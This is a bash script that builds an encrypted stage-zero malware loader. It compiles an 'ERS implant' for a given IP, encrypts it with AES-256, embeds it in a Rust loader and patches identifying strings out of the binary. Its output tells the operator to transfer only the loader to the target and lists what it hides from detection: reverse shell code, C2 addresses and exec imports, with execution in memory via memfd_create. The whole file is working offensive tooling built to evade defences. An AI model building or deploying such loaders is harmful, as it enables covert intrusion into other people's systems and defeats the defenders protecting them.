#!/bin/bash
# Build the Stage 0 Loader
# Usage: bash build_loader.sh [IP]
#
# This:
#   1. Builds the real ERS implant (if not already built)
#   2. Encrypts it with AES-256-CBC
#   3. Embeds the encrypted blob into the loader
#   4. Builds the loader (small binary, no malicious signatures)
#
# Transfer ONLY the loader to the target — never the raw implant.

set -e
cd "$(dirname "$0")"

echo "═══════════════════════════════════════════════"
echo "  ERS Stage 0 Loader Builder"
echo "═══════════════════════════════════════════════"

# Step 1: Build the implant if needed
IMPLANT="../implant"
if [ ! -f "$IMPLANT" ]; then
    echo "[*] Building implant first..."
    cd ..
    bash build.sh "$1"
    cd loader
else
    echo "[*] Using existing implant: $IMPLANT"
fi

echo "[*] Implant size: $(du -h "$IMPLANT" | cut -f1)"

# Step 2: Encrypt the implant
echo "[*] Encrypting implant..."
python3 encrypt_payload.py "$IMPLANT"

# Step 3: Build the loader
echo "[*] Building loader..."
RUSTFLAGS="--remap-path-prefix=$HOME=. --remap-path-prefix=$(pwd)=." \
  cargo build --release

# Step 4: Copy and scrub
cp target/release/ers-loader ./stage0
chmod +x ./stage0

# Scrub build artifacts from the binary
python3 -c "
data = bytearray(open('stage0','rb').read())
patches = [
    (b'/rustc/', b'\x00'*7),
    (b'/home/', b'\x00'*6),
    (b'.cargo/registry/', b'\x00'*16),
]
total = 0
for old, new in patches:
    assert len(old) == len(new)
    idx = 0
    while True:
        idx = data.find(old, idx)
        if idx == -1: break
        data[idx:idx+len(old)] = new
        idx += len(new)
        total += 1
open('stage0','wb').write(data)
print(f'[+] {total} string patches applied')
"

echo ""
echo "═══════════════════════════════════════════════"
echo "  BUILD COMPLETE"
echo "═══════════════════════════════════════════════"
echo ""
echo "  Loader:  ./stage0 ($(du -h stage0 | cut -f1))"
echo "  Implant: $IMPLANT ($(du -h "$IMPLANT" | cut -f1))"
echo ""
echo "  What to transfer: ONLY ./stage0"
echo "  The implant is encrypted inside it."
echo ""
echo "  On target:  ./stage0"
echo "  With debug: ./stage0 --debug"
echo ""
echo "  Detection surface during transfer:"
echo "    ✗ No reverse shell code visible"
echo "    ✗ No C2 strings (IP, .onion, ports)"
echo "    ✗ No network/exec syscall imports"
echo "    ✗ Payload is AES-256 encrypted blob"
echo "    ✓ Only a small decryptor + memfd_create"
echo ""
